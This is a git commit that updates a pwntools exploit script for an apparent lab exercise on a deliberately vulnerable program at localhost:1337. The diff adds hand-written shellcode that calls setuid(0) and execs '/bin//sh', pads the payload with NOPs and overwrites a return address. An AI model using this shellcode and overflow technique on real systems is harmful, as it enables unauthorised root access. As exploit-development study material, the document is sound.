83d7d2750edf222a9e448a073ab2bd9f13c77bcd
bravosixgoingdark <minhnhatbg05@gmail.com>
2024-12-03 15:33:34 +0700

    Update the solve.py file with the proper version as featured in the report.

--- vulnerable_code/solve.py
+++ vulnerable_code/solve.py
@@ -5,17 +5,23 @@ from pwn import *
 
 context.arch = 'amd64'
 
-#p = process('./vulnerable_program_static', aslr=False, env={})
 
 p = remote('127.0.0.1', 1337)
 
-
 payload = asm("""
-    xor rdi, rdi 
+	xor rdi, rdi
     mov rax, 0x69 
-    syscall 
+    syscall
+    xor rsi,rsi
+	push rsi
+	mov rdi,0x68732f2f6e69622f
+	push rdi
+	push rsp
+	pop rdi
+	push 59
+	pop rax
+	syscall
 """)
-payload += asm(shellcraft.sh())
 payload += asm(shellcraft.nop()) * (120 - len(payload)) 
 payload += p64(0x7fffffffec70)
 
